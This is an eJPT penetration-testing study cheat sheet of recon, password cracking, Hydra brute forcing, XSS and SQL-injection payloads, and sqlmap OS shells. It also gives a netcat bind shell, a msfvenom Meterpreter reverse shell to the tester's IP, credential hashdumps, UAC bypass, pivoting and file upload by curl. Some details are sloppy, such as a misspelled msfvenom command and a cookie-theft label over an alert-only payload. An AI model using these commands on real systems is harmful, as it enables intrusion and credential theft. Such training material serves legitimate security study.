# eJPT Cheat Sheet

[TOC]



## Networking

Check routing table information

```
$ route
$ ip route
```

Add a network to current route

```
$ ip route add 192.168.10.0/24 via 10.175.3.1
$ route add -net 192.168.10.0 netmask 255.255.255.0 gw 10.175.3.1
```
### Wireshark

Launch Wireshark on Interface
```
$ wireshark -i eth0 -k
```
Wireshark filters:
```
ip
ip.addr
ip.addr == 192.168.12.13
ip.addr == 192.168.12.13 or arp
not arp and !(udp.port == 53)
not ip
tcp port 80
net 192.168.54.0/24
src port 1234
src net 192.168.1.0/24
host 192.168.45.65
host www.examplehost.com
```



### Routing Table

Check routing tables on hosts

```
Linux: ip route
Windows: route print
OSX: netstat -r
```

Manually add the route to access other machines

```
ip route add {NETWORK/MASK} via {GATEWAYIP}
ip route add 192.168.222.0/24 via 10.175.34.1
ip route add {NETWORK/MASK} dev {DEVICE}
```

### MAC Addresses

Discover Mac Address of the network cards installed

```
Windows: ipconfig /all
*nix systems: ifconfig
Linux: ip addr
```

ARP Cache on a host:

```
Windows: arp -a
*nix: arp
Linux: ip neighbour
```

### Info on a host

Check listening ports and current TCP connection a host can use:

```
Windows: netstat -ano
Linux: netstat -tunp
MacOS: netstat -p tcp -p udp
lsof -n -i4TCP -i4UDP
```

TCPView from Sysinternal (Windows)

### DNS

Extract DNS information

```
$ nslookup mysite.com
$ dig mysite.com
```

### Most Common Ports

Insecure Protocols
| Port        | Service |
| ----------- | ------- |
| 20/21 tcp   | FTP     |
| 23 tcp      | Telnet  |
| 25 tcp      | SMTP    |
| 53 tcp/udp  | DNS     |
| 67,68 udp   | DHCP    |
| 69 udp      | TFTP    |
| 80 tcp      | HTTP    |
| 110 tcp     | POP3    |
| 123 udp     | NTP     |
| 137-139 udp | NetBIOS |
| 143 tcp     | IMAP4   |
| 161 udp     | SNMP    |
| 389 tcp/udp | LDAP    |
| 554 udp     | RTSP    |

Secure Protocols

| Port          | Service                                              |
| ------------- | ---------------------------------------------------- |
| 22 tcp        | SSH                                                  |
| 22 tcp        | SCP                                                  |
| 22 tcp        | SFTP                                                 |
| 53 tcp/udp    | DNSSEC                                               |
| 88 udp/tcp    | Kerberos                                             |
| 162 udp       | SNMPv3                                               |
| 389 tcp       | LDAPS                                                |
| 443 tcp       | HTTPS                                                |
| 500 udp       | IPsec                                                |
| 587 tcp       | SMTPS                                                |
| 993 tcp       | IMAP4                                                |
| 995 tcp       | POP3                                                 |
| 993 tcp       | S/MIME (Secure/Multipurpose Internet Mail Extension) |
| 989,990 tcp   | FTPS                                                 |
| 3389 tcp      | RDP                                                  |
| 5060,5061 udp | SIP                                                  |
| 5061 udp      | SRTP                                                 |
| 445 tcp       | SMB                                                  |
| 8443 tcp      | HTTPS web server (Apache Tomcat)                     |
| 8080 tcp      | HTTP Proxy                                           |
| 3306 tcp      | MySQL Database                                       |
| 1433,1434 tcp | Microsoft SQL Server                                 |




## Subdomain Enumeration

[Sublist3r](https://github.com/aboul3la/Sublist3r)

    sublist3r -d domain.xyz

[DNSdumpster](https://dnsdumpster.com/)

## Footprinting & Scanning

Ping host/Discover IP address

    ping -n 4 192.168.1.1
    tracert 192.168.1.1

Many firewalls will block normal pinging (which uses ICMP), so instead, we can use different kinds of pings like TCP SYN pings, TCP ACK pings, or UDP pings to get around that.

Find live hosts with Ping Sweeps

```
$ fping -a -g 172.16.100.40/24 2>/dev/null | tee alive_hosts.txt
$ nmap -sn 172.16.100.40/24 -oN alive_hosts.txt
```
### Nmap

Nmap Default and Fast Scans

    $ nmap 10.10.10.10 #Top 1000 ports (default scan)
    $ nmap -F 10.10.10.10 #Top 100 ports

Nmap Scan Types

```
-sS: TCP SYN Scan (aka Stealth Scan)
-sT: TCP Connect Scan 
-sU: UDP Scan
-sn: Port Scan
-Pn turns off host discovery (pinging), meaning all scanned hosts are assumed to be alive.
-sV: Service Version information
-O: Operating System information
```

Nmap Save Formats

    $ nmap -oN scan.txt 172.16.1.1 #default/normal output
    $ nmap -oX scanr.xml 172.16.1.1 #XML
    $ nmap -oG grep.txt 172.16.1.1 #grepable (easy to grep thru on Unix/Linux)
    $ nmap -oA 172.16.1.1 #save as all formats

Nmap Scripts (usr/share/nmap/scripts/)

    # This will run all the smb-vuln 
    $ nmap -p445 --script=smb-vuln-* <IP> -v scripts

Best Overall Nmap Scan

```
$ sudo nmap -T4 -Pn -n -vv -p- -A --open -iL ips.txt
```

### Spotting a Firewall

If an nmap TCP scan identified a well-known service, such as a web server, but cannot detect the version, then there may be a firewall in place.

For example:

```
PORT    STATE  SERVICE  REASON          VERSION
80/tcp  open   http?    syn-ack ttl 64
```

Another example:

```
80/tcp  open   tcpwrapped 
```

**"tcpwrapped"**  means the TCP handshake was completed, but the remote host closed the connection without receiving any data.

These are both indicators that a firewall is blocking our scan with the target!

Tips:

-   Use "--reason" to see why a port is marked open or closed
-   If a "RST" packet is received, then something prevented the connection - probably a firewall!

### Masscan

Masscan is designed to scan thousands of IP addresses at once. If you don’t want to use Nmap, you can use Masscan to scan thousands of IP addresses at once very quickly. Keep in mind that Masscan is meant for speed.

## Vulnerability Assessment

Use the information from the Enumeration/Footprinting phases to find a vulnerable threat vector.

Below are some helpful Vulnerability assessment resources:

-   Searchsploit
-   ExploitDB
-   Msfconsole search command
-   Google
-   Nessus `/etc/init.d/nessusd start #start Nessus scanner`

## Password Cracking & Directory Busting

### Recommended Password Lists

-   /usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt
-   /usr/share/seclists/Passwords/Leaked-Databases/rockyou-15.txt
-   /usr/share/wordlists/rockyou.txt

### Recommended Username Lists

-   /usr/share/ncrack/minimal.usr (sudo apt install ncrack)

### Hash Cracking with John the Ripper

    $ unshadow /etc/passwd /etc/shadow > hashes
    
    #Check OS Hashing Algorithm
    $ cat /etc/login.defs
    $ grep -A 18 ENCRYPT_METHOD /etc/login.defs
    
    $ john hashfile.txt
    
    $ john --wordlist=/path/to/your/wordlist.txt hashfile.txt
    
    $ john --format=ntlm hashfile.txt
    
    # Default file where cracked passwords are stored
    $ cat /root/.john/john.pot 
    
    # All types of passwords we can crack
    $ john --list=formats 
    
    # If you want to crack only certain users from the password database such as /etc/shadow file
    $ john -incremental -users:<users list>  <file to crack>  
    
    # Check cracked password after completion of cracking session, where crackme is the password database file
    $ john --show crackme 
    
    # Rules are used for cracking mangled words
    $ john -wordlist=<wordlist> -rules <file to crack>  

### Hash Cracking with Hashcat

    $ hashcat -m 0 -a 0 exam.hash file.dict
    
    # The rule file contains the rules to create mangled words such as p@ssword, PaSSworD https://hashcat.net/wiki/doku.php?id=rule_based_attack
    $ hashcat -m 0 -a 0 exam.hash file.dict -r rule/custom.rule 
    
    # Mask attack https://hashcat.net/wiki/doku.php?id=mask_attack
    $ hashcat -m 0 -a 3 exam.hash ?l?l?l?l?l?a 

### Brute Forcing with Hydra

    # Hydra uses a module for each service to attack. To get information about a module this command can be used
    $ hydra -U ftp  
    
    $ hydra -L users.txt -P pass.txt <service://server IP>  <options>
    
    # Stop attacking on finding first successful hit for user admin
    $ hydra -L admin -P pass.txt -f ftp://10.10.10.10 
    
    # Attacking http post form
    $ hydra 10.10.10.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:statement for incorrect login" -L /usr/share/ncrack/minimal.usr -P /etc/john/rockyou.txt -f -V 

Switches to know:

    -t: number of tasks run in parallel
    
    -V: verbose
    
    -f: quit brute-forcing once correct credentials have been found
    
    -L: username or usernames list
    
    -P: password or password list
    
    -s: which port to connect to

## Web Attacks 

### Web Server Fingerprinting

Overall Banner Grabbing using Netcat and Nmap

    nc  192.168.0.11 21  #nc {TARGET_IP} {PORT_NUMBER}
    nmap -sV --script=banner <target>  #nmap

Use netcat for HTTP banner grabbing:

```
$ nc <target addr> 80
HEAD / HTTP/1.0

```

Use OpenSSL for HTTPS banner grabbing:

```
$ openssl s_client -connect target.site:443
HEAD / HTTP/1.0

```

httprint is a web fingerprinting tool that uses  **signature-based**  technique to identify web servers. This is more accurate since sysadmins can customize web server banners.

```
$ httprint -P0 -h <target hosts> -s <signature file>
```

### Netcat (HTTP)

Can be used to open a raw connection to a service port

```
nc -h
nc -v www.ferrari.com 80
GET / HTTP/1.1
Host: www.ferrari.com


```

### Netcat 

```
#Connection
nc -lvp <port> #tcp
nc -lvup <port> #udp
nc -v <ip> <port> #tcp
nc -vu <ip> <port> #udp

#Send data
nc -lvp 8888 > received.txt
cat tobesent.txt | nc -v <ip> 8888

#Bind Shell
nc -lvp <port> -e /bin/bash
nc -v <ip> <port>

/bin/sh
```



### Directory and File Enumeration

Pick your favorite URI Enumeration tool
-   Dirbuster - GUI
-   Gobuster - fast, multi-threaded scanner
	- `gobuster -e -u http://192.168.0.155/ -w /usr/share/wordlists/dirb/common.txt`
-   Dirb - recursively scans directories
	- `dirb http://192.168.1.224/ /usr/share/wordlists/dirb/common.txt`

### XSS

-   **Reflected XSS:** Injected payload causes the website to reflect a change back to you, but it is not permanent and will disappear once the page has been refreshed
    
-   **Persistent/Stored XSS:** Injected payload is stored in the website’s server and is called every time a user visits the webpage. Affects multiple users. Typically embedded in forum posts.

Look to exploit user input coming from:

-   Request headers
-   Cookies
-   Form inputs
-   POST parameters
-   GET parameters

Check for XSS

```
<script>alert(1)</script>
<i>some text</i>

```

Steal cookies:

```
<script>alert(document.cookie)</script>

```

### SQL Injection

Same injection points as XSS.

Boolean Injection:

-   and 1=1; -- -
-   or 'a'='a'; -- -

Once you determine that a site is vulnerable to SQLi, automate with SQL Map.

```
$ sqlmap -u <url>
$ sqlmap -u <url> -p <parameter> #GET e POST
$ sqlmap -u <url> --tables
$ sqlmap -u <url> -D <database name> -T <table name> --dump

# Getting database names
$ sqlmap -u 'http://example.com/view.php?id=1141' --dbs 
# Getting table names
$ sqlmap -u 'http://example.com/view.php?id=1141' -D <DB_name> --tables 
# Getting columns
$ sqlmap -u 'http://example.com/view.php?id=1141' -D <db_name> -T <tbl_name> --columns 
# To dump whole table remove column specification from the command and use only --dump option
$ sqlmap -u 'http://example.com/view.php?id=1141' -D <DB_name> -T <tbl_name> -C <column_name_comma_separate> --dump 

#Get Shell
$ sqlmap -r request -p title --os-shell
```

## SQL and MySQL Commands

### Logging into MySQL Database with Password

    $ mysql -u USERNAME -pPASSWORD (no space after) -h HOST DB
    $ mysql --user=root --port=13306 -p -h 172.16.64.81

### Navigational Commands (for Post-Login)

    #show all databases
    SHOW  databases;
    
    #show tables from a database
    SHOW  tables  FROM  databases;
    
    #select a database  
    USE  database;
    
    #show everything in a certain table
    SELECT  *  FROM  table;  

Remember to end each SQL statement with a semicolon or it will not work.

### Change Table Entry Values

Add the user tracking1 to the "adm" group

`UPDATE users SET adm="yes"  WHERE username="tracking1";`

## FTP Anonymous Login

    ftp  <target_IP>  #enter “anonymous” as username and password

## Windows Shares Enumeration

Check what shares are available on a host

```
$ smbclient -L //ip 
$ enum4linux -a ip_address
```
## Windows Shares/NetBIOS

Authorized users can access shares by following this syntax (UNC paths):

    //ServerName/ShareName/file.nat

Special default admin shares:

-   **//ComputerName/C$** lets admins access a volume on the local machine. Every volume has a share (C\$, D\$, E\$).
    
-   **//ComputerName/admin$** points to the Windows installation directory.
    
-   **//ComputerName/IPC$** is used for inter-process communication (lets Windows processes talk to one another). You cannot browse it via Windows File Explorer.
    

**PC1<00>:**<00> represents the workstation service.

**PC2<03>:**<03> represents the messenger service

**PC3<20>:**<20> represents the server service (File and Printer sharing service is turned on)

When <20> is enabled, that means you should try to list shares. Try everything you see. Either you’ll get uncredentialed access (AKA a null session) to a share or you won’t.

    # Use this to see if SMB server is up
    $ nmblookup -A 10.10.10.10 
    
    # List shares
    $ smbclient -L //10.10.10.10 -N 
    
    # Mount share
    $ smbclient //10.10.10.10/share -N 
    
    # Enum4linux will list lots on shares but cannot mount shares 
    (you’ll have to use smbclient)
    $ enum4linux -a 10.10.10.10 
    
    # Dictionary Share Names
    $ enum4linux -s <file> demo.ine.local

Be sure to put the double slashes (“//”) before the IP when using smbclient. If that doesn’t work, try 4 “////”.

### SMB Null Attack

Try to login without a username or password:
```
$ smbclient //ip/share -N
```

## ARP Spoofing

ARP Spoofing is a type of MITM attack where you pretend to have the MAC of another device. ARP is used to map IP addresses to MAC addresses.

ARP cache: `arp -a` 

Hackers can use ARPspoof, ARPPoison, or Ettercap to poison your ARP cache. These tools are used to create ARP broadcasts by sending unsolicited ARP replies. Recall that any device that uses IP addresses has an ARP table.

Although ARPspoof is what INE recommends we use, I do not like it, so I end up using Ettercap for ARP spoofing attacks. Ettercap has a nice GUI and isn’t as cumbersome to use.

For those who would rather just use the command line ARPspoof, here are some commands to use:

    # Enable Linux kernel IP forwarding
    $ echo  1  > /proc/sys/net/ipv4/ip_forward
    $ arpspoof -i tap0 -t 10.10.10.10 -r 10.10.10.11

If ARPspoof isn’t working for you for some reason, install dsniff because it includes ARPspoof.

## Metasploit Useful Commands

    search <exploit>
    use <id or exploit name>
    info
    show options
    show payloads
    set <payload/parameters>
    check
    run/exploit
    sessions
    sessions -l
    sessions -K
    sessions <id>
    sessions -i <id>
    back
    download <victim file> <our machine path to store>
    upload <path to file on our machine> <path to store on target>
    #After disabling UAC, we can run this directly on meterpreter
    run post/windows/gather/win_privs

### Useful exploits/payloads/modules

    Payloads:
    windows/meterpreter/reverse_tcp
    linux/x86/meterpreter/reverse_tcp
    
    # Get Windows Registry Login Credentials
    post/windows/gather/credentials/windows_autologin
    # Bypass UAC to elevate privileges with getsystem
    use exploit/windows/local/bypassuac
    run post/windows/gather/win_privs
    # Dumping Password Database
    use post/windows/gather/hashdump
    
    Modules:
    multi/handler



## Meterpreter reverse shell

1.  Find vulnerability in target (e.g. LFI/RFI)
2.  Set up a Metasploit listener

```
use exploit/multi/handler
set payload linux/x64/meterpreter_reverse_tcp # or any payload you wish
set lhost <MY IP>
set lport <PORT>  # set to a port open on the target to bypass firewall
run
```

3.  Create a matching meterpreter-based executable using msfvenom

```
msfvenon -p linux/x64/meterpreter_reverse_tcp lhost=<MY IP> lport=<PORT> -f elf -o meter
```

4.  Upload the payload to target (e.g LFI/RFI)

## Meterpreter Useful Commands

    sysinfo
    background
    execute
    getuid
    hashdump
    ipconfig
    ifconfig
    migrate
    getpid
    ps
    #Display processes with only system privileges
    ps -U SYSTEM
    migrate -N <process>
    search
    shell
    screenshot
    route #check routing information
    getsystem #in case of error we have to bypass UAC
    use exploit/windows/local/bypassuac
    
    # Dump Password Database
    use post/windows/gather/hashdump

## Routing and Pivoting

Check your routing tables using these commands:

    ip route #Checking defined routes in Linux
    route #Checking defined routes in Linux
    route print #Checking defined routes in Windows

In order to add routes to your routing tables, you'll need to have admin permissions. Be sure to switch to root or use `sudo` before proceeding. Use these commands to add routes:

    ip route add <subnet> via <default gateway>
    ip route add 192.168.222.0/24 via 10.172.24.1 #10.172.24.1 is gateway for subnet 192.168.222.0/24

After adding a new route, check your routing tables to ensure the new route is saved.

### Meterpreter Autoroute for Pivoting

The easiest way I’ve found to pivot is by using the Meterpreter shell’s autoroute command. Keep in mind you can only do this if you have a Meterpreter session running on the exploited machine, otherwise, you’ll have to pivot manually. John Hammond recommends using plink.exe (a command-line version of PuTTY SSH client), but we really don’t need to.

    meterpreter> run autoroute -h
    meterpreter> run autoroute -p #show active route table
    
    meterpreter> run autoroute -s <subnet>
    or
    msf> route add 192.69.228.0 255.255.255.0 <session id>
    
    msf> route print #check IPv4 Routing Table

Afterwards we can use modules to further explore the victim:

    use scanner/portscan/tcp

Or even use Port Forwarding to forward our requests to the new target:

    meterpreter> portfwd -h
    #THIS OPENS UP PORT <LOCAL PORT> ON THE ORIGINAL MACHINE AND NOT ON THE FIRST TARGET MACHINE
    meterpreter> portfwd add -l <local port> -p <target port> -r <target ip>
    nmap -sV 127.0.0.1 -p <local port defined above> 

## Transfer Files

Simple HTTP Server Python

```
Start a local webserver
cd <directory of file we need to transfer>
python3 -m http.server 8000

Transfer file on remote host (command is executed on the remote host)
wget http://<ip>:<port>/<file_to_transfer>
curl http://<ip>:<port>/<file_to_transfer> -o <new_file_name>
curl http://<ip>:<port> --upload-file <file_name>
```



## Adding Virtual Hosts

In the black box practice labs, we had to add a virtual host to /etc/hosts in order to connect to the webpage.

```
$ sudo vim /etc/hosts
<IP addr>	static.foobar.org
```



## Google Dorks

- site:
- intitle:
- inurl:
- filetype:
- AND, OR, &, |
- -

## Misc

-   Found a webshell/admin panel on a site?
-   Run phpinfo(); to determine if it is a PHP shell
-   Try to get a reverse shell connection
-   Check for flag in the user's home directory
-   Enumerate, enumerate, enumerate

